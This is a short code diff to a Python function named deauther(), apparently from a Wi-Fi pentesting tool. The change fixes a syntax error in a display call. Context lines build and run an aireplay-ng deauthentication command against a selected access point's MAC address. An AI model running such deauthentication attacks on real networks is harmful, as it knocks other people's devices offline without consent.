@@ -1516,7 +1516,7 @@ def deauther():
     target = getSSID()
     print(target)
     #name,channel,mac
-    DisplayText("this will work","for 10 second","","","",""."")
+    DisplayText("this will work","for 10 second","","","","","")
     target= target.split(",")
     cmd="aireplay-ng -0 10 -a " + target[2] + " wlan0mon"
     res = execcmd(cmd)
